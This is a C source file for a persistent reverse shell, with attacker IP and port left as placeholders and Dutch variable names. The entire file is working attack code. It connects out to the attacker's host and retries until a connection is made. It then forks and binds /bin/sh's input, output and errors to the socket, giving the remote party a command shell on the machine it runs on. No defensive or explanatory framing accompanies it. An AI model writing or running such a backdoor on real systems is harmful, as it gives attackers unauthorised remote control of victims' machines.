#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

 
int main(){ 

	int socket_info;
    int connectie;
    int pid;
    struct sockaddr_in aanvaller_info;

    while(1){
		socket_info = socket(AF_INET, SOCK_STREAM, 0);
	    aanvaller_info.sin_family = AF_INET;
	    aanvaller_info.sin_port = htons(<PORT ATTACK>);
	    aanvaller_info.sin_addr.s_addr = inet_addr("<IP ATTACK>"); //since this is a reverse shell, the 'attacker's IP address should be put here.
		printf("Set data.\n");
		
		printf("Trying to perform a new connection\n");
	    connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
		while(connectie < 0){
			printf("Connection Failed\n");
			sleep(5);
			connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
	    }
	    connectie = write(socket_info,"Connection Completed\n",36);
	    
	    printf("Successful Connection\n");
	    
	    pid = fork();
	    if(pid > 0){
			printf("Forking Process\n");
			wait(NULL);
		}
		if(pid == 0){
			printf("Process Forked Successfully\n");
			dup2(socket_info,0); // input
			dup2(socket_info,1); // output
			dup2(socket_info,2); // errors
			execl("/bin/sh", "/bin/sh", NULL);
	        usleep(3000);
		}
	    printf("The connection was closed, trying to reconnect...\n");
    
	}

	return 0;

}
